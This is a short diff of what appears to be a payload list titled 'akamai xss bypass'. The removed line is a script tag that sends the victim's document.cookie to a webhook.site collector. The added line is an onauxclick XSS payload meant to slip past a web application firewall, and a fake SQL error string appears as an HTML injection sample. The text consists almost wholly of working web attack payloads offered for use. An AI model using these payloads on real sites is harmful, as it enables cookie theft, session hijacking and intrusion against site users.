@@ -2,7 +2,7 @@
 
 # akamai xss bypass 
 ```
-<script>fetch("https://webhook.site/4dcdb1f2-0fbe-40e1-a90c-ca71732a7f1a?cookie=" + encodeURIComponent(document.cookie))</script>
+<h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
 ```
 ```
 <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;</font>
